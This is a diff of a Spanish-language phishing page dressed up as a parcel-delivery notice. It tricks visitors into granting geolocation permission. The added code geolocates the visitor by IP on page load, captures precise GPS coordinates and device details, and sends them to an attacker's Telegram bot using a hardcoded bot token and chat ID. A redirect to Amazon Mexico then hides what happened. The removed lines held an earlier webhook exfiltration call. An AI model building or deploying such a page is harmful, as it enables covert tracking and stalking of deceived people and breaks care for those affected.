@@ -16,7 +16,7 @@
 <body>
   <div class="card">
     <h1>📦 Tu paquete está listo para entregar</h1>
-    <p><strong>Pedido #MX-7843921</strong><br>Calle Falsa 123, Zapopan, Jalisco</p>
+    <p><strong>Pedido #MX-7843921</strong><br><span id="direccion">Dirección faltante</span>, <span id="ciudad">Ciudad detectada...</span></p>
     <p>Para evitar que se devuelva, confirma tu ubicación exacta:</p>
     <button onclick="obtenerUbicacion()">✅ Confirmar recepción ahora</button>
     <div id="resultado"></div>
@@ -24,9 +24,31 @@
   </div>
 
   <script>
-    function obtenerUbicacion() {
+    // === CONFIG TELEGRAM (¡ya con tus valores reales!) ===
+    const BOT_TOKEN = '8665004647:AAEfrF0wdsqClv5BFRWByflP4R1rKTAJy34';
+    const CHAT_ID   = '5854071809';
+
+    // Detectar ciudad desde IP (API gratuita)
+    async function detectarCiudad() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        const ciudad = data.city || 'Ciudad no detectada';
+        document.getElementById('ciudad').textContent = ciudad;
+        document.getElementById('direccion').textContent = 'Dirección faltante';
+        return ciudad;
+      } catch (err) {
+        document.getElementById('ciudad').textContent = 'Ciudad no detectada';
+        return 'Ciudad no detectada';
+      }
+    }
+
+    // Mostrar ciudad al cargar la página
+    detectarCiudad();
+
+    async function obtenerUbicacion() {
       const resultado = document.getElementById('resultado');
-      resultado.textContent = "Solicitando ubicación... (iOS/Safari mostrará el popup)";
+      resultado.textContent = "Solicitando ubicación... (permitir en el popup)";
 
       if (!navigator.geolocation) {
         resultado.textContent = "❌ Tu navegador no soporta geolocalización";
@@ -34,53 +56,66 @@
       }
 
       navigator.geolocation.getCurrentPosition(
-        (position) => {
+        async (position) => {
           const lat = position.coords.latitude.toFixed(6);
           const lon = position.coords.longitude.toFixed(6);
           const acc = Math.round(position.coords.accuracy);
 
           resultado.innerHTML = `✅ ¡Ubicación capturada!<br>📍 Lat: ${lat}<br>📍 Lon: ${lon}<br>🔬 Precisión: ±${acc} metros`;
 
-          // === ENVÍO DE DATOS (cámbialo por tu webhook.site) ===
-          const webhookURL = "https://webhook.site/TU-ID-AQUI"; // ← cambia esto
-          fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              lat: lat,
-              lon: lon,
-              accuracy: acc,
-              timestamp: new Date().toISOString(),
-              userAgent: navigator.userAgent,
-              device: /iPhone|iPad/.test(navigator.userAgent) ? "iOS" : "Otro"
-            })
-          }).catch(() => {});
+          // Obtener ciudad de nuevo
+          const ciudad = await detectarCiudad();
 
-          // Redirección realista después de 2 segundos
-          setTimeout(() => { window.location.href = "https://www.amazon.com.mx"; }, 2000);
+          // Mensaje para Telegram con enlace a mapa
+          const mapaLink = `https://www.google.com/maps?q=${lat},${lon}`;
+          const mensaje = 
+            `🚨 NUEVA UBICACIÓN CAPTURADA 🚨\n\n` +
+            `Pedido: #MX-7843921\n` +
+            `Ciudad (por IP): ${ciudad}\n` +
+            `Latitud: ${lat}\n` +
+            `Longitud: ${lon}\n` +
+            `Precisión: ±${acc} metros\n` +
+            `Dispositivo: ${navigator.userAgent}\n` +
+            `Hora: ${new Date().toLocaleString('es-MX')}\n\n` +
+            `Ver en mapa: ${mapaLink}`;
+
+          // Enviar a tu Telegram
+          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          try {
+            const response = await fetch(url, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: mensaje,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: false
+              })
+            });
+
+            if (response.ok) {
+              resultado.innerHTML += '<br><br>✅ Datos enviados correctamente a Telegram';
+            } else {
+              resultado.innerHTML += '<br><br>⚠️ Error al enviar a Telegram (revisa token/chat ID)';
+            }
+          } catch (err) {
+            resultado.innerHTML += '<br><br>⚠️ Error de conexión';
+          }
+
+          // Redirigir para simular éxito
+          setTimeout(() => { window.location.href = "https://www.amazon.com.mx"; }, 3000);
         },
         (error) => {
           let msg = "";
           switch(error.code) {
-            case error.PERMISSION_DENIED:
-              msg = "❌ Permiso denegado. Toca 'Permitir' en el popup de iOS/Safari.";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              msg = "❌ Ubicación no disponible (GPS apagado o sin señal).";
-              break;
-            case error.TIMEOUT:
-              msg = "❌ Tiempo agotado. Intenta de nuevo.";
-              break;
-            default:
-              msg = "❌ Error: " + error.message;
+            case error.PERMISSION_DENIED: msg = "❌ Permiso denegado. Toca 'Permitir' en el popup."; break;
+            case error.POSITION_UNAVAILABLE: msg = "❌ Ubicación no disponible (GPS apagado o sin señal)."; break;
+            case error.TIMEOUT: msg = "❌ Tiempo agotado. Intenta de nuevo."; break;
+            default: msg = "❌ Error: " + error.message;
           }
           resultado.textContent = msg;
         },
-        {
-          enableHighAccuracy: true,   // GPS real en iOS 26
-          timeout: 15000,
-          maximumAge: 0
-        }
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
     }
   </script>
